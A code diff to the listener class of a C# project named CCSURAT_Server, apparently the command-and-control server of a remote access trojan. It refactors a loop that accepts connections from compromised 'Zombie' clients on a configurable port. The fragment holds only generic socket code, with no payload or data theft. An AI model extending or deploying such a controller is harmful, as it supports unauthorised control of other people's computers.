@@ -11,42 +11,47 @@ namespace CCSURAT_Server
 
         // Store main form for its console
         private ServerMainForm mainForm;
-
         private List<Zombie> zombies;
+
+        TcpListener listener;
+
+        private Boolean isListening;
 
         public Listener(ServerMainForm form, List<Zombie> zombies, int port)
         {
             this.mainForm = form;
             this.zombies = zombies;
+            listener = new TcpListener(IPAddress.Any, port);
+            isListening = true;
             Log("Listener initialized.");
         }
 
-        public void Start()
+        // Listens to incoming client connections and spawns a new client "Zombie" object
+        // when a pending connection is detected.
+        public void Listen()
         {
             try {
-                Boolean isConnected = false;
-                TcpListener listener = new TcpListener(IPAddress.Any, 7777);
-
-                while (isConnected == false)
+                listener.Start();
+                while (isListening)
                 {
-                    listener.Start();
-
-                    TcpClient client = listener.AcceptTcpClient();
-                    Zombie zombie = new Zombie(mainForm, client);
-                    zombies.Add(zombie);
-                    //Console.Beep();
-                    Thread slaveThread = new Thread(new ThreadStart(zombie.ListenForData));
-
-                    slaveThread.Start();
-                    Log("Accepted Client Connection");
-
-                    isConnected = true;
+                    if (listener.Pending())
+                    {
+                        TcpClient client = listener.AcceptTcpClient();
+                        Zombie zombie = new Zombie(mainForm, client);
+                        zombies.Add(zombie);
+                        Thread slaveThread = new Thread(new ThreadStart(zombie.ListenForData));
+                        slaveThread.IsBackground = true;
+                        slaveThread.Start();
+                        Log("Accepted Client Connection");
+                    }
                 }
             }catch(Exception ex)
             {
                 Log("Listener error: " + ex.ToString());
             }
         }
+
+
 
         private void Log(string s)
         {
